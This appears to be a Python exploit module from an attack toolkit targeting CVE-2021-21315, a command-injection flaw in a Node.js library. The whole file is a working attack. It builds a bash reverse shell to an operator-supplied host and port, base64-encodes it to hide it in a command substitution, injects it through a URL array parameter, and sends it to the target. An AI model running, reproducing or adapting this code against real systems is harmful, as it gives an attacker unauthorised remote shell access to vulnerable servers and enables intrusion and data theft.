#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from urllib.request import quote
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
import requests
import base64
class Cve_2021_21315Nc:
    def __init__(self):
        self.header = None
        self.proxy = None

    def payload_wrapper(self,lhost, lport, url):
        Payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        Payload = base64.b64encode(Payload.encode()).decode()
        Payload = quote(f"$(echo '{Payload}' | base64 -d | bash)")

        url = url + f'[]={Payload}'
        return url

    def send_payload(self,url):
        OutPrintInfo("Node-JS", "Sending Payload ...")
        try:
            req = requests.get(url, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
        except:
            # TODO: Write a better exception Handler
            OutPrintInfo("Node-JS", "Check your listener")
            return
    def main(self,target):
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        header = target["header"]
        lhost = target["lhost"]
        lport = target["lport"]
        self.verify = target["ssl"]

        self.header,self.proxy = ReqSet(proxy=proxy,header=header)
        self.send_payload(self.payload_wrapper(lhost, lport, url))
